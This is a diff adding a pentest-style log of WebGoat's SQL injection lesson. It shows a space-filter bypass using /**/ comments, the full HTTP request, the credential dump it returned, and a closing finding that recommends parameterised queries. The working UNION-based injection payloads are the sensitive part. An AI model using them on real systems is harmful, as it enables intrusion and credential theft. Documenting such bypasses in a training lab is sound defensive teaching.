@@ -1,0 +1,41 @@
+Lesson: SQL Injection (mitigation) / assignment SqlOnlyInputValidation ("Input validation alone is not enough")
+Captured via Chrome DevTools Network panel (live browser interaction), Run #9, 2026-11-16T11:24:37Z
+
+### Attempt 1 (blocked by filter)
+POST /WebGoat/SqlOnlyInputValidation/attack
+Body (decoded): userid_sql_only_input_validation=nonexistent' UNION SELECT userid, user_name, password, cookie, NULL, NULL, NULL FROM user_system_data --
+Response: {"feedback":"Using spaces is not allowed!", ...}
+-> Confirms the lesson's developer added a space-character blocklist filter as a "fix" for the earlier
+   UNION-based SQLi (F-SQLI-06).
+
+### Attempt 2 (filter bypassed) - SUCCESSFUL
+POST http://10.242.10.31:8007/WebGoat/SqlOnlyInputValidation/attack HTTP/1.1
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Cookie: JSESSIONID=EB5681DBBE34AF0FD5E2A4E855CBA117
+
+userid_sql_only_input_validation=nonexistent'%2F**%2FUNION%2F**%2FSELECT%2F**%2Fuserid%2Cuser_name%2Cpassword%2Ccookie%2CNULL%2CNULL%2CNULL%2F**%2FFROM%2F**%2Fuser_system_data%2F**%2F--%2F**%2F
+
+(decoded: nonexistent'/**/UNION/**/SELECT/**/userid,user_name,password,cookie,NULL,NULL,NULL/**/FROM/**/user_system_data/**/--/**/)
+
+### Response
+HTTP/1.1 200
+{
+  "assignment" : "SqlOnlyInputValidation",
+  "attemptWasMade" : true,
+  "feedback" : "You have succeeded: <p>USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT,
+  101, jsnow, passwd1, ... 105, dave, passW0rD, ... </p>Well done!",
+  "lessonCompleted" : true,
+  "output" : "Your query was: SELECT * FROM user_data WHERE last_name = 'nonexistent'/**/UNION/**/SELECT/**/
+  userid,user_name,password,cookie,NULL,NULL,NULL/**/FROM/**/user_system_data/**/--/**/'"
+}
+
+### Analysis (finding F-SQLI-07)
+The developer attempted to fix SQL injection by blocking the literal space character (a blocklist/keyword-
+style filter), WITHOUT switching to parameterized queries. Substituting every space with the SQL inline
+comment `/**/` (a well-known, decades-old bypass technique) completely defeated the filter and reproduced
+the exact same cross-table credential dump as F-SQLI-06. This is a textbook demonstration that input-
+validation-only "fixes" for SQL injection are insufficient without parameterized queries/prepared statements
+(exactly the point this lesson itself teaches, now empirically confirmed against the live app rather than
+just read as lesson text).
+Severity: HIGH per Section 3j rubric - full sensitive-data exfiltration without RCE, via a defeated blocklist
+filter (ASVS V1.2.4; also demonstrates V5.3.2-adjacent insufficient input validation as the sole control).
